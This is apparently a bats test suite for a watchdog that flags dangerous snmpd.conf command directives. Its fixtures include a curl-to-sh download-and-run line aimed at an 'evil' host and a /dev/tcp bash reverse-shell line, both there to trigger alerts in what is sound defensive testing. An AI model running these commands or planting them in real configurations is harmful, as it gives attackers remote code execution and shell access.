#!/usr/bin/env bats
# L2 bats functional tests for the snmpd-exec-watchdog scan script.
#
# Companion to L2-dhcpd-exec-watchdog.bats, covering a DIFFERENT
# trigger class: snmpd command directives (exec / extend / pass /
# pass_persist) are remotely reachable — an SNMP GET to the planted
# OID makes snmpd run the named program, so a directive pointing at a
# writable/attacker program is remotely-triggerable command execution
# (T1546/T1059). The directive grammar differs from dhcpd's
# execute() — `<directive> [name] <prog> [args...]`, scanned by token.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# config/baseline pointed at a tmp sandbox via SELFDEF_SNMPD_* env
# knobs. Locks the same `"severity":"alert"` token SDD-062 routes on.
#
# Run with: bats packaging/test/L2-snmpd-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/snmpd-exec-watchdog/systemd/snmpd-exec-watchdog.sh"
# SDD-061 D-6: scan script now sources the shared module-lib.
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/snmpd.conf"
    EMPTY="${TMP}/empty"; mkdir -p "${EMPTY}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SNMPD_PROFILE="${PROFILE:-report}" \
    SELFDEF_SNMPD_BASELINE="${BASELINE}" \
    SELFDEF_SNMPD_DIRS="${EMPTY}" \
    SELFDEF_SNMPD_FILES="${CONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no snmpd config present → ok / no_snmpd" {
    run_wd
    cap | grep -q '"event":"no_snmpd"'
    cap | grep -q '"severity":"ok"'
}

@test "benign exec directive, first run → ok / baseline_initial" {
    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / snmpd_exec_intact" {
    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"snmpd_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — the SDD-062 contract token
# ============================================================

@test "extend directive pointing under a writable root → alert" {
    printf 'extend evilcheck /tmp/payload.sh\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "pass_persist directive carrying a curl|sh injection → alert" {
    printf 'pass_persist .1.3.6.1.4.1.8072 /bin/sh -c "curl http://evil|sh"\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "exec directive with a /dev/tcp reverse-shell token → alert" {
    printf 'exec rsh /bin/bash -c "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign directive added after baseline → warn / snmpd_exec_changed" {
    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
    run_wd
    printf 'exec uptimecheck /usr/bin/uptime\nexec memcheck /usr/bin/free\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"snmpd_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "directive under /usr/local is NOT flagged (no alert)" {
    printf 'extend localcheck /usr/local/bin/health\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# SDD-061 D-6 — shared-lib dependency fails loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'extend evilcheck /tmp/payload.sh\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits zero on a benign baseline" {
    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -eq 0 ]
}
